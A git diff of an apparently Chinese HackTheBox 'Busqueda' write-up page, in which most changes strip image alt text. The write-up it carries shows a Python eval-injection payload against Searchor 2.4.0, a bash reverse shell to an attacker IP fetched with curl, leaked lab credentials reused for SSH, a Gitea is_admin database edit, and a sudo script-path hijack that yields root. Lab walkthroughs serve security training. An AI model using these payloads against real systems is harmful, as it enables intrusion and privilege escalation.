@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://sh0ve1.github.io/img/15.jpg">
 <meta property="article:published_time" content="2023-04-26T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-05-09T03:30:37.863Z">
+<meta property="article:modified_time" content="2023-05-09T03:41:24.346Z">
 <meta property="article:author" content="sh0ve1">
 <meta property="article:tag" content="hackthebox">
 <meta property="article:tag" content="python3-eval">
@@ -261,48 +261,48 @@
 <h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><ul>
 <li>访问 <a target="_blank" rel="noopener" href="http://10.10.11.208/">http://10.10.11.208</a> ，自动跳转到 <a target="_blank" rel="noopener" href="http://searcher.htb/">http://searcher.htb/</a> 。</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/1.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/1.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
-<li>由于无法解析该域名，导致无法访问。在&#x2F;etc&#x2F;hosts中添加<code>10.10.11.208    searcher.htb</code>后，再次访问该网站。在首页底部发现该网站存在flask和 <a target="_blank" rel="noopener" href="https://github.com/ArjunSharda/Searchor/releases/tag/v2.4.0">Searchor 2.4.0</a>。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/2.png" srcset="/img/loading.gif" lazyload alt="image.png"></li>
+<li>由于无法解析该域名，导致无法访问。在&#x2F;etc&#x2F;hosts中添加<code>10.10.11.208    searcher.htb</code>后，再次访问该网站。在首页底部发现该网站存在flask和 <a target="_blank" rel="noopener" href="https://github.com/ArjunSharda/Searchor/releases/tag/v2.4.0">Searchor 2.4.0</a>。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/2.png" srcset="/img/loading.gif" lazyload></li>
 </ul>
 <h2 id="User-Privilege"><a href="#User-Privilege" class="headerlink" title="User Privilege"></a>User Privilege</h2><ul>
 <li>Google搜索发现 Searchor 2.4.0 版本存在代码执行漏洞。</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/3.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/3.png" srcset="/img/loading.gif" lazyload></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">engine, query, <span class="hljs-built_in">open</span>, copy</span>):<br><span class="hljs-keyword">try</span>:<br>url = <span class="hljs-built_in">eval</span>(<br><span class="hljs-string">f&quot;Engine.<span class="hljs-subst">&#123;engine&#125;</span>.search(&#x27;<span class="hljs-subst">&#123;query&#125;</span>&#x27;, copy\_url=<span class="hljs-subst">&#123;copy&#125;</span>, open\_web=<span class="hljs-subst">&#123;<span class="hljs-built_in">open</span>&#125;</span>)&quot;</span><br>)<br>click.echo(url)<br>searchor.history.update(engine, query, url)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">open</span>:<br>click.echo(<span class="hljs-string">&quot;opening browser...&quot;</span>)<br><span class="hljs-keyword">if</span> copy:<br>click.echo(<span class="hljs-string">&quot;link copied to clipboard&quot;</span>)<br><span class="hljs-keyword">except</span> AttributeError:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;engine not recognized&quot;</span>)<br></code></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sunxb10/article/details/81036693">Python f-string介绍</a></p>
-<p>根据f-string 的特性，先利用用户输入生成eval的表达式，然后再使用eval执行表达式。<br>eval函数会执行作为参数的表达式，<a target="_blank" rel="noopener" href="https://realpython.com/python-eval-function/">具体细节请参考该链接</a>，此处是执行search函数。<br>根据如下例子可知，如果search函数内部还有函数，那么也会被执行。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>根据f-string 的特性，先利用用户输入生成eval的表达式，然后再使用eval执行表达式。<br>eval函数会执行作为参数的表达式，<a target="_blank" rel="noopener" href="https://realpython.com/python-eval-function/">具体细节请参考该链接</a>，此处是执行search函数。<br>根据如下例子可知，如果search函数内部还有函数，那么也会被执行。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/4.png" srcset="/img/loading.gif" lazyload></p>
 <p>对于输入参数query并没有检查，因此我可以构造一个payload：<code>dd&#39;+str(__import__(&#39;os&#39;).system(&#39;whoami&#39;)))#</code></p>
-<p>如果shell命令执行成功则会返回0，拼接在<code>dd</code>后面。本地尝试成功，但是在目标机器上失败。这是由于url编码问题，会将<code>+</code>视为空格，所以导致不成功。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>如果shell命令执行成功则会返回0，拼接在<code>dd</code>后面。本地尝试成功，但是在目标机器上失败。这是由于url编码问题，会将<code>+</code>视为空格，所以导致不成功。<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/5.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/6.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>换一个字符串拼接方式，payload：<code>dd&#39;.join(str(__import__(&#39;os&#39;).system(&#39;whoami&#39;))))#</code></li>
 </ul>
 <p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/7.png" srcset="/img/loading.gif" lazyload alt="image"></p>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/8.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/8.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li><p>在本地和目标机器都能成功执行</p>
 </li>
-<li><p>读取用户flag<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<li><p>读取用户flag<br><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/9.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 </ul>
 <h2 id="Root-Privilege"><a href="#Root-Privilege" class="headerlink" title="Root Privilege"></a>Root Privilege</h2><ul>
 <li>由于当前用户svc的权限很小，尝试使用curl从kali上获取反弹shell脚本并通过管道符传给bash。<br><code>bash -c &quot;bash -i &gt;&amp; 10.10.14.34/10001 0&gt;&amp;1&quot;</code></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/10.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/11.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/10.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/11.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>在.git目录中发现敏感信息。获得一个子域名 <code>gitea.searcher.htb</code> ，以及该网站的账号信息 <code>cody:jh1usoih2bkjaspwe92</code></li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/12.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/12.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li><p>尝试使用ssh登录发现，用户svc的系统账号信息<code>svc:jh1usoih2bkjaspwe92</code></p>
 </li>
 <li><p><code>sudo -l</code> 发现可以以root权限执行<code>/opt/scripts/system-checkup.py</code>，但是无法查看该脚本具体内容。为了提权，现在需要获得该脚本的内容。</p>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/13.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/13.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>尝试执行该命令，发现有三个action可选择执行</li>
 </ul>
@@ -327,28 +327,28 @@
 <li><p>先访问一下网站试试。修改host,访问gitea.searcher.htb，并使用cody账号登陆。发现还存在administrator账户，由于权限问题，无法访问其仓库。</p>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/14.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/14.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>cody的仓库里面就是searcher网站源码，由此可以推测 administrator 的仓库里可能存在 <code>/opt/scripts/system-checkup.py</code> 的源码。现在的想法是获取 administrator 的密码从而有权访问其仓库。</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/15.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/15.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li><p>直接root登录一下数据库：<code>mysql -u root -h 127.0.0.1 -p</code></p>
 </li>
 <li><p>查看gitea数据库中的user表，发现加密算法是pbkdf2,这长度看着就不好搞。:（一时陷入僵局。</p>
 </li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/16.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/16.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>迷茫一段时间之后，突然发现每个用户都有 <code>is_admin</code> 属性，尝试直接使用sql语句修改cody的权限。</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/17.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/17.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>刷新网页，发现了一个网站管理入口。其中发现了 administrator 的仓库 scripts</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/18.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/19.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/20.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/18.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/19.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/20.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>获得 <code>/opt/scripts/system-checkup.py</code> 的代码如下。</li>
 </ul>
@@ -364,11 +364,11 @@
 <li>在家目录中创建一个 <code>full-checkup.sh</code> 文件，内容如下。并在当前目录下执行该命令，发现成功提权。</li>
 </ul>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/21.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/21.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>使用bash反弹shell命令替换<code>id</code>命令,获取root权限的shell，最终成功读取root.txt。</li>
 </ul>
-<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/22.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/HTB-Busqueda/22.png" srcset="/img/loading.gif" lazyload></p>
 <h2 id="Surmary"><a href="#Surmary" class="headerlink" title="Surmary"></a>Surmary</h2><ul>
 <li>理清思路，不要盲目地乱渗透；</li>
 <li>善用搜索引擎。</li>
